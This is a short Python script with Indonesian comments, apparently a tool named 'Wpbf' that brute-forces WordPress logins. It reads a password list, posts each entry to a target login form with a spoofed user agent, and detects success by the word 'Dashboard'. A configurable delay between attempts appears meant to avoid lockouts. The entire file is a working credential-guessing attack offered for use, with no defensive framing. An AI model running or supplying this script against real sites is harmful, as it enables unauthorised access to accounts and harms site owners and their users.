import requests
import argparse
import time
import random

def login_wordpress(url, username, password_path, delay):
    # Membaca file password
    with open(password_path, 'r') as file:
        passwords = file.read().splitlines()

    # Mencoba login dengan setiap password
    for password in passwords:
        # Membuat session
        session = requests.Session()

        # Mengatur user agent secara acak
        user_agents = [
            'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
        ]
        session.headers.update({'User-Agent': random.choice(user_agents)})

        # Membuat payload untuk login
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': url,
            'testcookie': '1'
        }

        # Mengirim POST request untuk login
        response = session.post(url, data=payload)

        # Memeriksa apakah login berhasil
        if 'Dashboard' in response.text:
            print(f'Successful login! Username: {username}, Password: {password}')
            break
        else:
            print(f'Failed login! Username: {username}, Password: {password}')

        # Menunggu selama delay yang ditentukan sebelum mencoba password berikutnya
        time.sleep(delay)

if __name__ == '__main__':
    # Membaca argumen dari command line
    parser = argparse.ArgumentParser(description='Wpbf to WordPress By FebryEnsz')
    parser.add_argument('-t', '--url', help='URL of the WordPress site', required=True)
    parser.add_argument('-u', '--username', help='Username for login', required=True)
    parser.add_argument('-p', '--password', help='Path to the password list file', required=True)
    parser.add_argument('-d', '--delay', type=int, help='Delay in seconds between login attempts', required=True)
    args = parser.parse_args()

    # Memanggil fungsi login_wordpress dengan argumen yang diberikan
    login_wordpress(args.url, args.username, args.password, args.delay)
